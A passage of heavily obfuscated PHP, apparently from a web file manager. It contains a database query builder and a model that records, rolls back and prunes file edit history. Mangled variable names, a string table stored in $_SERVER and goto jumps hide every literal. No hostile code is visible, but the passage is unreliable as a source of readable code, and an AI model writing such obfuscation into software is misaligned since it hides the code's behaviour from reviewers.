$³õ÷¯ñğ[53] . $this->parseValue($§œßŒŠõ[1]); } elseif (preg_match($³õ÷¯ñğ[1007], $§œßŒŠõ[0])) { $ñå÷éÖ .= $ÓœËÙì . $³õ÷¯ñğ[53] . $this->exp[$É»ºÖÃ—] . $³õ÷¯ñğ[53] . $this->parseValue($§œßŒŠõ[1]); } elseif (preg_match($³õ÷¯ñğ[1008], $§œßŒŠõ[0])) { if (is_array($§œßŒŠõ[1])) { $ñÁûßÑù = isset($§œßŒŠõ[2]) ? strtoupper($§œßŒŠõ[2]) : $³õ÷¯ñğ[993]; if (in_array($ñÁûßÑù, array($³õ÷¯ñğ[992], $³õ÷¯ñğ[993], $³õ÷¯ñğ[994]))) { $ŞÓÌ»€Ğ = array(); foreach ($§œßŒŠõ[1] as $â÷ë×öÊ) { $ŞÓÌ»€Ğ[] = $ÓœËÙì . $³õ÷¯ñğ[53] . $this->exp[$É»ºÖÃ—] . $³õ÷¯ñğ[53] . $this->parseValue($â÷ë×öÊ); } $ñå÷éÖ .= $³õ÷¯ñğ[269] . implode($³õ÷¯ñğ[53] . $ñÁûßÑù . $³õ÷¯ñğ[53], $ŞÓÌ»€Ğ) . $³õ÷¯ñğ[896]; } } else { $ñå÷éÖ .= $ÓœËÙì . $³õ÷¯ñğ[53] . $this->exp[$É»ºÖÃ—] . $³õ÷¯ñğ[53] . $this->parseValue($§œßŒŠõ[1]); } } elseif ($³õ÷¯ñğ[306] == $É»ºÖÃ—) { $ñå÷éÖ .= $³õ÷¯ñğ[894] . $ÓœËÙì . $³õ÷¯ñğ[53] . $§œßŒŠõ[1] . $³õ÷¯ñğ[1009]; } elseif (preg_match($³õ÷¯ñğ[1010], $§œßŒŠõ[0])) { $ñå÷éÖ .= $§œßŒŠõ[0]; } elseif (preg_match($³õ÷¯ñğ[1011], $§œßŒŠõ[0])) { if (isset($§œßŒŠõ[2]) && $³õ÷¯ñğ[306] == $§œßŒŠõ[2]) { $ñå÷éÖ .= $ÓœËÙì . $³õ÷¯ñğ[53] . $this->exp[$É»ºÖÃ—] . $³õ÷¯ñğ[53] . $§œßŒŠõ[1]; } else { if (is_string($§œßŒŠõ[1])) { $§œßŒŠõ[1] = explode($³õ÷¯ñğ[50], $§œßŒŠõ[1]); } $Ü”å…™ = implode($³õ÷¯ñğ[50], $this->parseValue($§œßŒŠõ[1])); $ñå÷éÖ .= $ÓœËÙì . $³õ÷¯ñğ[53] . $this->exp[$É»ºÖÃ—] . $³õ÷¯ñğ[894] . $Ü”å…™ . $³õ÷¯ñğ[896]; } } elseif (preg_match($³õ÷¯ñğ[1012], $§œßŒŠõ[0])) { $±¾Ô‰ı = is_string($§œßŒŠõ[1]) ? explode($³õ÷¯ñğ[50], $§œßŒŠõ[1]) : $§œßŒŠõ[1]; $ñå÷éÖ .= $³õ÷¯ñğ[894] . $ÓœËÙì . $³õ÷¯ñğ[53] . $this->exp[$É»ºÖÃ—] . $³õ÷¯ñğ[53] . $this->parseValue($±¾Ô‰ı[0]) . $³õ÷¯ñğ[995] . $this->parseValue($±¾Ô‰ı[1]) . $³õ÷¯ñğ[287]; } else { think_exception(think_lang($³õ÷¯ñğ[998]) . $³õ÷¯ñğ[4] . $§œßŒŠõ[0]); } } else { $ºÌ²õØ‰ = count($§œßŒŠõ); $åîƒÔÄ‹ = $³õ÷¯ñğ[12]; if (is_string($§œßŒŠõ[$ºÌ²õØ‰ - 1])) { $åîƒÔÄ‹ = isset($§œßŒŠõ[$ºÌ²õØ‰ - 1]) ? strtoupper($§œßŒŠõ[$ºÌ²õØ‰ - 1]) : $³õ÷¯ñğ[12]; if (in_array($åîƒÔÄ‹, array($³õ÷¯ñğ[992], $³õ÷¯ñğ[993], $³õ÷¯ñğ[994]))) { $ºÌ²õØ‰ = $ºÌ²õØ‰ - 1; } } else { $åîƒÔÄ‹ = $³õ÷¯ñğ[992]; } for ($í¢šşûÈ = 0; $í¢šşûÈ < $ºÌ²õØ‰; $í¢šşûÈ++) { $±¾Ô‰ı = is_array($§œßŒŠõ[$í¢šşûÈ]) ? $§œßŒŠõ[$í¢šşûÈ][1] : $§œßŒŠõ[$í¢šşûÈ]; if ($³õ÷¯ñğ[306] == strtolower($§œßŒŠõ[$í¢šşûÈ][0])) { $ñå÷éÖ .= $³õ÷¯ñğ[269] . $ÓœËÙì . $³õ÷¯ñğ[53] . $±¾Ô‰ı . $³õ÷¯ñğ[1009] . $åîƒÔÄ‹ . $³õ÷¯ñğ[53]; } else { $»Ì±³àë = is_array($§œßŒŠõ[$í¢šşûÈ]) ? $this->exp[strtolower($§œßŒŠõ[$í¢šşûÈ][0])] : $³õ÷¯ñğ[875]; if (!$»Ì±³àë && is_array($§œßŒŠõ[$í¢šşûÈ]) && in_array($§œßŒŠõ[$í¢šşûÈ][0], array($³õ÷¯ñğ[875], $³õ÷¯ñğ[1002], $³õ÷¯ñğ[1003], $³õ÷¯ñğ[1004], $³õ÷¯ñğ[1005], $³õ÷¯ñğ[1006]))) { $»Ì±³àë = $§œßŒŠõ[$í¢šşûÈ][0]; } $ñå÷éÖ .= $³õ÷¯ñğ[269] . $ÓœËÙì . $³õ÷¯ñğ[53] . $»Ì±³àë . $³õ÷¯ñğ[53] . $this->parseValue($±¾Ô‰ı) . $³õ÷¯ñğ[1009] . $åîƒÔÄ‹ . $³õ÷¯ñğ[53]; } } $ñå÷éÖ = substr($ñå÷éÖ, 0, -4); } } else { $ñå÷éÖ .= $ÓœËÙì . $³õ÷¯ñğ[1013] . $this->parseValue($§œßŒŠõ); } return $ñå÷éÖ; } protected function parseThinkWhere($Ø ñ ü®, $ÁÌ£œÖ®) { $ËÓ™ÕÑ =& $_SERVER[ĞÆÏ¡Îª]; $¬ñ¨ªüÜ = $ËÓ™ÕÑ[12]; switch ($Ø ñ ü®) { case $ËÓ™ÕÑ[361]: $¬ñ¨ªüÜ = $ÁÌ£œÖ®; break; case $ËÓ™ÕÑ[996]: $¬ñ¨ªüÜ = is_string($ÁÌ£œÖ®) ? $ÁÌ£œÖ® : substr($this->parseWhere($ÁÌ£œÖ®), 6); break; case $ËÓ™ÕÑ[1014]: parse_str($ÁÌ£œÖ®, $‹ˆ¥œÔ¸); if (isset($‹ˆ¥œÔ¸[$ËÓ™ÕÑ[991]])) { $…¶ñË = $ËÓ™ÕÑ[53] . strtoupper($‹ˆ¥œÔ¸[$ËÓ™ÕÑ[991]]) . $ËÓ™ÕÑ[53]; unset($‹ˆ¥œÔ¸[$ËÓ™ÕÑ[991]]); } else { $…¶ñË = $ËÓ™ÕÑ[995]; } $Ÿìæİâ´ = array(); foreach ($‹ˆ¥œÔ¸ as $€Ğ°³¦Ç => $ë”£á›œ) { $Ÿìæİâ´[] = $this->parseKey($€Ğ°³¦Ç) . $ËÓ™ÕÑ[1013] . $this->parseValue($ë”£á›œ); } $¬ñ¨ªüÜ = implode($…¶ñË, $Ÿìæİâ´); break; } return $¬ñ¨ªüÜ; } protected function parseLimit($¼™èÀı) { $€ûÉŸÛ =& $_SERVER[ĞÆÏ¡Îª]; return !empty($¼™èÀı) ? $€ûÉŸÛ[51] . $¼™èÀı . $€ûÉŸÛ[53] : $€ûÉŸÛ[12]; } protected function parseJoin($¤öñ½Ò) { $Øı€ñËô =& $_SERVER[ĞÆÏ¡Îª]; $¸´¸Ë¦ˆ = $Øı€ñËô[12]; if (!empty($¤öñ½Ò)) { if (is_array($¤öñ½Ò)) { foreach ($¤öñ½Ò as $‡ê™˜àá => $æÂøˆ) { if (!1 !== stripos($æÂøˆ, $Øı€ñËô[1015])) { $¸´¸Ë¦ˆ .= $Øı€ñËô[53] . $æÂøˆ; } else { $¸´¸Ë¦ˆ .= $Øı€ñËô[1016] . $æÂøˆ; } } } else { $¸´¸Ë¦ˆ .= $Øı€ñËô[1016] . $¤öñ½Ò; } } $¸´¸Ë¦ˆ = preg_replace($Øı€ñËô[1017], think_config($Øı€ñËô[921]) . $Øı€ñËô[1018], $¸´¸Ë¦ˆ); return $¸´¸Ë¦ˆ; } protected function parseOrder($ûğÅü«) { $•·âÂÒ€ =& $_SERVER[ĞÆÏ¡Îª]; if (is_array($ûğÅü«)) { $Î²ÓáÊ  = array(); foreach ($ûğÅü« as $¹â¦¡Õ† => $’¾ıœşÙ) { if (is_numeric($¹â¦¡Õ†)) { $Î²ÓáÊ [] = $this->parseKey($’¾ıœşÙ); } else { $’¾ıœşÙ = in_array(strtoupper(trim($’¾ıœşÙ)), array($•·âÂÒ€[1019], $•·âÂÒ€[1020])) ? $•·âÂÒ€[53] . $’¾ıœşÙ : $•·âÂÒ€[12]; if (preg_match($•·âÂÒ€[1021], $¹â¦¡Õ†)) { $Î²ÓáÊ [] = $this->parseKey($¹â¦¡Õ†) . $’¾ıœşÙ; } else { think_exception($•·âÂÒ€[1022] . $¹â¦¡Õ†); } } } $ûğÅü« = implode($•·âÂÒ€[50], $Î²ÓáÊ ); } return !empty($ûğÅü«) ? $•·âÂÒ€[1023] . $ûğÅü« : $•·âÂÒ€[12]; } protected function parseGroup($åã×—¸) { $ù†Éñùé =& $_SERVER[ĞÆÏ¡Îª]; return !empty($åã×—¸) ? $ù†Éñùé[1024] . $åã×—¸ : $ù†Éñùé[12]; } protected function parseHaving($‰úñó¾Ö) { $È¾ô©´ê =& $_SERVER[ĞÆÏ¡Îª]; return !empty($‰úñó¾Ö) ? $È¾ô©´ê[1025] . $‰úñó¾Ö : $È¾ô©´ê[12]; } protected function parseComment($®¦šùú) { $úÛ”à—Ï =& $_SERVER[ĞÆÏ¡Îª]; return !empty($®¦šùú) ? $úÛ”à—Ï[1026] . $®¦šùú . $úÛ”à—Ï[1027] : $úÛ”à—Ï[12]; } protected function parseDistinct($”È”‹´) { $¥‘ë¤Œ± =& $_SERVER[ĞÆÏ¡Îª]; return !empty($”È”‹´) ? $¥‘ë¤Œ±[1028] : $¥‘ë¤Œ±[12]; } protected function parseUnion($ùë©”÷ú) { $‹ˆ–’Òé =& $_SERVER[ĞÆÏ¡Îª]; if (empty($ùë©”÷ú)) { return $‹ˆ–’Òé[12]; } if (isset($ùë©”÷ú[$‹ˆ–’Òé[357]])) { $Ü–£ÈÖÑ = $‹ˆ–’Òé[1029]; unset($ùë©”÷ú[$‹ˆ–’Òé[357]]); } else { $Ü–£ÈÖÑ = $‹ˆ–’Òé[1030]; } foreach ($ùë©”÷ú as $×Œ€±¸¢) { $é¯«¯Ï[] = $Ü–£ÈÖÑ . (is_array($×Œ€±¸¢) ? $this->buildSelectSql($×Œ€±¸¢) : $×Œ€±¸¢); } return implode($‹ˆ–’Òé[53], $é¯«¯Ï); } public function insert($ºª…„ß–, $º«øÓ = array(), $°ºƒÁöÛ = false) { $ÍËÌÍô° =& $_SERVER[ĞÆÏ¡Îª]; $€ìôÀ = $³“¿Ü¾ = array(); $this->model = $º«øÓ[$ÍËÌÍô°[290]]; foreach ($ºª…„ß– as $±Â½Òí¡ => $º·ôôË) { if (is_array($º·ôôË) && $ÍËÌÍô°[306] == $º·ôôË[0]) { $³“¿Ü¾[] = $this->parseKey($±Â½Òí¡); $€ìôÀ[] = $º·ôôË[1]; } elseif (is_scalar($º·ôôË) || is_null($º·ôôË)) { $³“¿Ü¾[] = $this->parseKey($±Â½Òí¡); $€ìôÀ[] = $this->parseValue($º·ôôË); } } $íí›Ô¦ = ($°ºƒÁöÛ ? $ÍËÌÍô°[898] : $ÍËÌÍô°[899]) . $ÍËÌÍô°[900] . $this->parseTable($º«øÓ[$ÍËÌÍô°[288]]) . $ÍËÌÍô°[894] . implode($ÍËÌÍô°[50], $³“¿Ü¾) . $ÍËÌÍô°[895] . implode($ÍËÌÍô°[50], $€ìôÀ) . $ÍËÌÍô°[896]; $íí›Ô¦ .= $this->parseLock(isset($º«øÓ[$ÍËÌÍô°[838]]) ? $º«øÓ[$ÍËÌÍô°[838]] : !1); $íí›Ô¦ .= $this->parseComment(!empty($º«øÓ[$ÍËÌÍô°[363]]) ? $º«øÓ[$ÍËÌÍô°[363]] : $ÍËÌÍô°[12]); return $this->execute($íí›Ô¦, $this->parseBind(!empty($º«øÓ[$ÍËÌÍô°[294]]) ? $º«øÓ[$ÍËÌÍô°[294]] : array())); } public function selectInsert($ÃªĞ›·, $ÜÎ»àÄ, $ûÕ•‘—‘ = array()) { $ÓÅö®ÑÇ =& $_SERVER[ĞÆÏ¡Îª]; $this->model = $ûÕ•‘—‘[$ÓÅö®ÑÇ[290]]; if (is_string($ÃªĞ›·)) { $ÃªĞ›· = explode($ÓÅö®ÑÇ[50], $ÃªĞ›·); } array_walk($ÃªĞ›·, array($this, $ÓÅö®ÑÇ[897])); $Ôİ–±»© = $ÓÅö®ÑÇ[1031] . $this->parseTable($ÜÎ»àÄ) . $ÓÅö®ÑÇ[894] . implode($ÓÅö®ÑÇ[50], $ÃªĞ›·) . $ÓÅö®ÑÇ[1009]; $Ôİ–±»© .= $this->buildSelectSql($ûÕ•‘—‘); return $this->execute($Ôİ–±»©, $this->parseBind(!empty($ûÕ•‘—‘[$ÓÅö®ÑÇ[294]]) ? $ûÕ•‘—‘[$ÓÅö®ÑÇ[294]] : array())); } public function update($Ş¾Õ‡ª¨, $Œ£†Ö¬) { $¿“à®ÀŠ =& $_SERVER[ĞÆÏ¡Îª]; $this->model = $Œ£†Ö¬[$¿“à®ÀŠ[290]]; $Ş˜»Îè = $¿“à®ÀŠ[1032] . $this->parseTable($Œ£†Ö¬[$¿“à®ÀŠ[288]]) . $this->parseSet($Ş¾Õ‡ª¨) . $this->parseWhere(!empty($Œ£†Ö¬[$¿“à®ÀŠ[284]]) ? $Œ£†Ö¬[$¿“à®ÀŠ[284]] : $¿“à®ÀŠ[12]) . $this->parseOrder(!empty($Œ£†Ö¬[$¿“à®ÀŠ[374]]) ? $Œ£†Ö¬[$¿“à®ÀŠ[374]] : $¿“à®ÀŠ[12]) . $this->parseLimit(!empty($Œ£†Ö¬[$¿“à®ÀŠ[301]]) ? $Œ£†Ö¬[$¿“à®ÀŠ[301]] : $¿“à®ÀŠ[12]) . $this->parseLock(isset($Œ£†Ö¬[$¿“à®ÀŠ[838]]) ? $Œ£†Ö¬[$¿“à®ÀŠ[838]] : !1) . $this->parseComment(!empty($Œ£†Ö¬[$¿“à®ÀŠ[363]]) ? $Œ£†Ö¬[$¿“à®ÀŠ[363]] : $¿“à®ÀŠ[12]); return $this->execute($Ş˜»Îè, $this->parseBind(!empty($Œ£†Ö¬[$¿“à®ÀŠ[294]]) ? $Œ£†Ö¬[$¿“à®ÀŠ[294]] : array())); } public function delete($Ë…„Îƒå = array()) { $’ÊÑ±ÉÜ =& $_SERVER[ĞÆÏ¡Îª]; $this->model = $Ë…„Îƒå[$’ÊÑ±ÉÜ[290]]; $òŸ¾¤Í = $’ÊÑ±ÉÜ[1033] . $this->parseTable($Ë…„Îƒå[$’ÊÑ±ÉÜ[288]]) . $this->parseWhere(!empty($Ë…„Îƒå[$’ÊÑ±ÉÜ[284]]) ? $Ë…„Îƒå[$’ÊÑ±ÉÜ[284]] : $’ÊÑ±ÉÜ[12]) . $this->parseOrder(!empty($Ë…„Îƒå[$’ÊÑ±ÉÜ[374]]) ? $Ë…„Îƒå[$’ÊÑ±ÉÜ[374]] : $’ÊÑ±ÉÜ[12]) . $this->parseLimit(!empty($Ë…„Îƒå[$’ÊÑ±ÉÜ[301]]) ? $Ë…„Îƒå[$’ÊÑ±ÉÜ[301]] : $’ÊÑ±ÉÜ[12]) . $this->parseLock(isset($Ë…„Îƒå[$’ÊÑ±ÉÜ[838]]) ? $Ë…„Îƒå[$’ÊÑ±ÉÜ[838]] : !1) . $this->parseComment(!empty($Ë…„Îƒå[$’ÊÑ±ÉÜ[363]]) ? $Ë…„Îƒå[$’ÊÑ±ÉÜ[363]] : $’ÊÑ±ÉÜ[12]); return $this->execute($òŸ¾¤Í, $this->parseBind(!empty($Ë…„Îƒå[$’ÊÑ±ÉÜ[294]]) ? $Ë…„Îƒå[$’ÊÑ±ÉÜ[294]] : array())); } public function select($ ×œàşÉ = array()) { $Úè³Æ“ =& $_SERVER[ĞÆÏ¡Îª]; $this->model = $ ×œàşÉ[$Úè³Æ“[290]]; $†ÔÍ¥Ò— = $this->buildSelectSql($ ×œàşÉ); $ê±‡È¢ = isset($ ×œàşÉ[$Úè³Æ“[358]]) ? $ ×œàşÉ[$Úè³Æ“[358]] : !1; if ($ê±‡È¢) { $æÃÓ˜ÅÆ = is_string($ê±‡È¢[$Úè³Æ“[94]]) ? $ê±‡È¢[$Úè³Æ“[94]] : $Úè³Æ“[1034] . md5($†ÔÍ¥Ò—); $¤…Äûçî = think_cache($æÃÓ˜ÅÆ, $Úè³Æ“[12], $ê±‡È¢); if (!1 !== $¤…Äûçî) { return $¤…Äûçî; } } $¯ËƒüÕ§ = $this->query($†ÔÍ¥Ò—, $this->parseBind(!empty($ ×œàşÉ[$Úè³Æ“[294]]) ? $ ×œàşÉ[$Úè³Æ“[294]] : array())); if ($ê±‡È¢ && !1 !== $¯ËƒüÕ§) { think_cache($æÃÓ˜ÅÆ, $¯ËƒüÕ§, $ê±‡È¢); } return $¯ËƒüÕ§; } public function buildSelectSql($‚Î Ï…½ = array()) { $á–ÕÄÒÑ =& $_SERVER[ĞÆÏ¡Îª]; if (isset($‚Î Ï…½[$á–ÕÄÒÑ[362]])) { if (strpos($‚Î Ï…½[$á–ÕÄÒÑ[362]], $á–ÕÄÒÑ[50])) { list($Å›Äè­¾, $œÙü ¶) = explode($á–ÕÄÒÑ[50], $‚Î Ï…½[$á–ÕÄÒÑ[362]]); } else { $Å›Äè­¾ = $‚Î Ï…½[$á–ÕÄÒÑ[362]]; } $Å›Äè­¾ = $Å›Äè­¾ ? $Å›Äè­¾ : 1; $œÙü ¶ = isset($œÙü ¶) ? $œÙü ¶ : (is_numeric($‚Î Ï…½[$á–ÕÄÒÑ[301]]) ? $‚Î Ï…½[$á–ÕÄÒÑ[301]] : 20); $Üˆ‘ƒ•Ô = $œÙü ¶ * ((int) $Å›Äè­¾ - 1); $‚Î Ï…½[$á–ÕÄÒÑ[301]] = $Üˆ‘ƒ•Ô . $á–ÕÄÒÑ[50] . $œÙü ¶; } if (think_config($á–ÕÄÒÑ[1035])) { $àÛˆÍ = $á–ÕÄÒÑ[1036] . md5(serialize($‚Î Ï…½)); $¢ çÉÓ‰ = think_cache($àÛˆÍ); if ($¢ çÉÓ‰) { return $¢ çÉÓ‰; } } $ÅàŞÛâ = $this->parseSql($this->selectSql, $‚Î Ï…½); $ÅàŞÛâ .= $this->parseLock(isset($‚Î Ï…½[$á–ÕÄÒÑ[838]]) ? $‚Î Ï…½[$á–ÕÄÒÑ[838]] : !1); if (isset($àÛˆÍ)) { think_cache($àÛˆÍ, $ÅàŞÛâ); } return $ÅàŞÛâ; } public function parseSql($±·”Àû¤, $ÚŞ•÷¬ú = array()) { $šŒÀÜîâ =& $_SERVER[ĞÆÏ¡Îª]; $±·”Àû¤ = str_replace(array($šŒÀÜîâ[1037], $šŒÀÜîâ[1038], $šŒÀÜîâ[1039], $šŒÀÜîâ[1040], $šŒÀÜîâ[1041], $šŒÀÜîâ[1042], $šŒÀÜîâ[1043], $šŒÀÜîâ[1044], $šŒÀÜîâ[1045], $šŒÀÜîâ[1046], $šŒÀÜîâ[1047]), array($this->parseTable("{$ÚŞ•÷¬ú[$šŒÀÜîâ[288]]}"), $this->parseDistinct(isset($ÚŞ•÷¬ú[$šŒÀÜîâ[1048]]) ? $ÚŞ•÷¬ú[$šŒÀÜîâ[1048]] : !1), $this->parseField(!empty($ÚŞ•÷¬ú[$šŒÀÜîâ[282]]) ? $ÚŞ•÷¬ú[$šŒÀÜîâ[282]] : $šŒÀÜîâ[188]), $this->parseJoin(!empty($ÚŞ•÷¬ú[$šŒÀÜîâ[291]]) ? $ÚŞ•÷¬ú[$šŒÀÜîâ[291]] : $šŒÀÜîâ[12]), $this->parseWhere(!empty($ÚŞ•÷¬ú[$šŒÀÜîâ[284]]) ? $ÚŞ•÷¬ú[$šŒÀÜîâ[284]] : $šŒÀÜîâ[12]), $this->parseGroup(!empty($ÚŞ•÷¬ú[$šŒÀÜîâ[524]]) ? $ÚŞ•÷¬ú[$šŒÀÜîâ[524]] : $šŒÀÜîâ[12]), $this->parseHaving(!empty($ÚŞ•÷¬ú[$šŒÀÜîâ[1049]]) ? $ÚŞ•÷¬ú[$šŒÀÜîâ[1049]] : $šŒÀÜîâ[12]), $this->parseOrder(!empty($ÚŞ•÷¬ú[$šŒÀÜîâ[374]]) ? $ÚŞ•÷¬ú[$šŒÀÜîâ[374]] : $šŒÀÜîâ[12]), $this->parseLimit(!empty($ÚŞ•÷¬ú[$šŒÀÜîâ[301]]) ? $ÚŞ•÷¬ú[$šŒÀÜîâ[301]] : $šŒÀÜîâ[12]), $this->parseUnion(!empty($ÚŞ•÷¬ú[$šŒÀÜîâ[356]]) ? $ÚŞ•÷¬ú[$šŒÀÜîâ[356]] : $šŒÀÜîâ[12]), $this->parseComment(!empty($ÚŞ•÷¬ú[$šŒÀÜîâ[363]]) ? $ÚŞ•÷¬ú[$šŒÀÜîâ[363]] : $šŒÀÜîâ[12])), $±·”Àû¤); return $±·”Àû¤; } public function getLastSql($îøîç = '') { return $îøîç ? $this->modelSql[$îøîç] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¸¯ÊœÑ) { return addslashes($¸¯ÊœÑ); } public function setModel($ƒú¤ÜÑ) { $this->model = $ƒú¤ÜÑ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto a”óâ—îˆ; E¦ˆÒµğ: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\162\143\x65\x5f\x68\151\163\164\x6f\x72\x79"; public function historyCount($˜±œÅˆª) { $ªÌä®‘ =& $_SERVER[ĞÆÏ¡Îª]; if (!$˜±œÅˆª) { return array(); } if (is_string($˜±œÅˆª) || is_int($˜±œÅˆª)) { $˜±œÅˆª = array($˜±œÅˆª); } $ÔüÜÙš˜ = array($ªÌä®‘[411], $ªÌä®‘[1852] => $ªÌä®‘[509]); $Ò»ğî˜¾ = array($ªÌä®‘[411] => array($ªÌä®‘[7], $˜±œÅˆª)); $¨£ü¼Š¢ = $this->field($ÔüÜÙš˜)->where($Ò»ğî˜¾)->group($ªÌä®‘[411])->select(); return array_to_keyvalue($¨£ü¼Š¢, $ªÌä®‘[411], $ªÌä®‘[509]); } public function addHistory($àºİøÍ, $ğÈßˆœı = '') { $ö¥¤ªº¯ =& $_SERVER[ĞÆÏ¡Îª]; $äãİƒ¢„ = array($ö¥¤ªº¯[426] => $àºİøÍ[$ö¥¤ªº¯[411]], $ö¥¤ªº¯[1638] => isset($àºİøÍ[$ö¥¤ªº¯[465]]) ? $àºİøÍ[$ö¥¤ªº¯[465]] : $àºİøÍ[$ö¥¤ªº¯[463]], $ö¥¤ªº¯[478] => $àºİøÍ[$ö¥¤ªº¯[477]], $ö¥¤ªº¯[594] => $àºİøÍ[$ö¥¤ªº¯[76]], $ö¥¤ªº¯[2058] => $ğÈßˆœı); if ($GLOBALS[$ö¥¤ªº¯[6]][$ö¥¤ªº¯[89]][$ö¥¤ªº¯[1200]] >= 1) { $this->historyAutoClear($äãİƒ¢„[$ö¥¤ªº¯[411]]); $this->add($äãİƒ¢„); } Hook::trigger($ö¥¤ªº¯[2059], $äãİƒ¢„); Model($ö¥¤ªº¯[2060])->eventFileEdit($àºİøÍ[$ö¥¤ªº¯[411]]); } private function historyAutoClear($¯Ïï¤û) { $¢Ã½õá =& $_SERVER[ĞÆÏ¡Îª]; $æºàÄÛ¬ = Model($¢Ã½õá[765])->get($¢Ã½õá[1222]); $¹ÜÜòÙ¤ = $GLOBALS[$¢Ã½õá[6]][$¢Ã½õá[89]][$¢Ã½õá[1200]]; $Æ‰âáæ  = $æºàÄÛ¬ == $¢Ã½õá[1223] ? min(5, $¹ÜÜòÙ¤) : $¹ÜÜòÙ¤; $Æ‰âáæ  = $Æ‰âáæ  <= 0 ? 0 : $Æ‰âáæ  - 1; if ($Æ‰âáæ  >= 500) { return; } $İÈµ¼Öé = array($¢Ã½õá[426] => $¯Ïï¤û); $µ¼­ñ×¿ = $this->field($¢Ã½õá[2061])->where($İÈµ¼Öé)->order($¢Ã½õá[2055])->select(); if (!$µ¼­ñ×¿ || $Æ‰âáæ  >= count($µ¼­ñ×¿)) { return; } $øğÆ¨ = array_to_keyvalue($µ¼­ñ×¿, $¢Ã½õá[12], $¢Ã½õá[407]); $øğÆ¨ = array_slice($øğÆ¨, $Æ‰âáæ ); $â×”ËıÄ = array_to_keyvalue($µ¼­ñ×¿, $¢Ã½õá[12], $¢Ã½õá[477]); $â×”ËıÄ = array_slice($â×”ËıÄ, $Æ‰âáæ ); if (!$øğÆ¨ || !$â×”ËıÄ) { return; } $İÈµ¼Öé = array($¢Ã½õá[428] => array($¢Ã½õá[7], $øğÆ¨)); $this->where($İÈµ¼Öé)->delete(); Model($¢Ã½õá[480])->remove($â×”ËıÄ); } public function listData($Öåãê®) { $¿®Ë‹ç— =& $_SERVER[ĞÆÏ¡Îª]; $İö¶¬„Š = array($¿®Ë‹ç—[426] => $Öåãê®); $ÄÖáè˜ı = $¿®Ë‹ç—[2062]; $ÂŒ®‰©  = $this->field($ÄÖáè˜ı)->where($İö¶¬„Š)->order($¿®Ë‹ç—[2055])->selectPage(); $this->_listAppendUser($ÂŒ®‰© [$¿®Ë‹ç—[378]]); $¿Úù÷ßÇ = Model($¿®Ë‹ç—[765])->get($¿®Ë‹ç—[1222]); $¿ËËñè = 5; if ($¿Úù÷ßÇ == $¿®Ë‹ç—[1223]) { $ÂŒ®‰© [$¿®Ë‹ç—[378]] = array_slice($ÂŒ®‰© [$¿®Ë‹ç—[378]], 0, $¿ËËñè); $ÂŒ®‰© [$¿®Ë‹ç—[375]] = array($¿®Ë‹ç—[2063] => 1, $¿®Ë‹ç—[2064] => 20, $¿®Ë‹ç—[2065] => 1, $¿®Ë‹ç—[2066] => count($ÂŒ®‰© [$¿®Ë‹ç—[378]])); } return $ÂŒ®‰© ; } protected function _listAppendUser(&$ğåÛí) { $İÇ‰ùÀï =& $_SERVER[ĞÆÏ¡Îª]; $¨ß‘¥‡š = array_to_keyvalue($ğåÛí, $İÇ‰ùÀï[12], $İÇ‰ùÀï[1647]); $×›‚ÚÓ­ = Model($İÇ‰ùÀï[544])->userListInfo($¨ß‘¥‡š); foreach ($ğåÛí as &$–¯¹šê) { $º•‡•Óª = $–¯¹šê[$İÇ‰ùÀï[1647]]; $–¯¹šê[$İÇ‰ùÀï[463]] = $×›‚ÚÓ­[$º•‡•Óª] ? $×›‚ÚÓ­[$º•‡•Óª] : !1; } unset($–¯¹šê); } public function fileInfo($Ä‡Úã·“) { $×ÇÓ½²ï =& $_SERVER[ĞÆÏ¡Îª]; $ÏÎíŠ»¼ = $this->tablePrefix; $‘¤¢—‰µ = "{$ÏÎíŠ»¼}\x69\157\x5f\x66\151\x6c\145\40\146\x69\154\145\163\40\157\156\40\x66\x69\154\145\x73\x2e\146\x69\x6c\145\x49\104\x20\x3d\40\150\151\x73\164\157\162\x79\56\x66\x69\x6c\x65\x49\104"; return $this->alias($×ÇÓ½²ï[2067])->where(array($×ÇÓ½²ï[428] => $Ä‡Úã·“))->join($‘¤¢—‰µ, $×ÇÓ½²ï[2068])->find(); } public function removeItem($ŸÍÒÇŸü) { $Ø”Şô¡ß =& $_SERVER[ĞÆÏ¡Îª]; $”¤¥ª‘¾ = array($Ø”Şô¡ß[428] => $ŸÍÒÇŸü); $ÇŒóŠ‘å = $this->where($”¤¥ª‘¾)->find(); if ($ÇŒóŠ‘å) { $£ĞË˜¹ = $this->where($”¤¥ª‘¾)->delete(); Model($Ø”Şô¡ß[480])->remove($ÇŒóŠ‘å[$Ø”Şô¡ß[477]]); return $£ĞË˜¹; } return !1; } public function removeBySource($Õ®ƒâ³) { $®—§‡íÄ =& $_SERVER[ĞÆÏ¡Îª]; if (!$Õ®ƒâ³) { return !1; } if (!is_array($Õ®ƒâ³)) { $Õ®ƒâ³ = array($Õ®ƒâ³); } $¥ñ”îº = array($®—§‡íÄ[426] => array($®—§‡íÄ[7], $Õ®ƒâ³)); $¸ğ©‰Î = $this->field($®—§‡íÄ[478])->where($¥ñ”îº)->select(); if ($¸ğ©‰Î) { $this->where($¥ñ”îº)->delete(); $¦àıÇ½¦ = array_to_keyvalue($¸ğ©‰Î, $®—§‡íÄ[12], $®—§‡íÄ[477]); Model($®—§‡íÄ[480])->remove($¦àıÇ½¦); } return !0; } public function setDetail($œêÂ˜÷‰, $©õıÒîê) { $ÊÄ²äèó =& $_SERVER[ĞÆÏ¡Îª]; return $this->where(array($ÊÄ²äèó[428] => $œêÂ˜÷‰))->save(array($ÊÄ²äèó[2058] => $©õıÒîê)); } public function rollbackToItem($è³Š¸®Ã, $³ñß§ş‰) { $´Õş£‰§ =& $_SERVER[ĞÆÏ¡Îª]; $¡¹ù—®À = Model($´Õş£‰§[820])->sourceInfo($è³Š¸®Ã); $this->addHistory($¡¹ù—®À, LNG($´Õş£‰§[2069])); $áìı®æŠ = $this->find($³ñß§ş‰); $’ĞÀøÆ¯ = array($´Õş£‰§[477] => $áìı®æŠ[$´Õş£‰§[477]], $´Õş£‰§[76] => $áìı®æŠ[$´Õş£‰§[76]], $´Õş£‰§[85] => time(), $´Õş£‰§[465] => USER_ID); Model($´Õş£‰§[820])->where(array($´Õş£‰§[411] => $è³Š¸®Ã))->save($’ĞÀøÆ¯); return $this->where(array($´Õş£‰§[428] => $³ñß§ş‰))->delete(); } public function 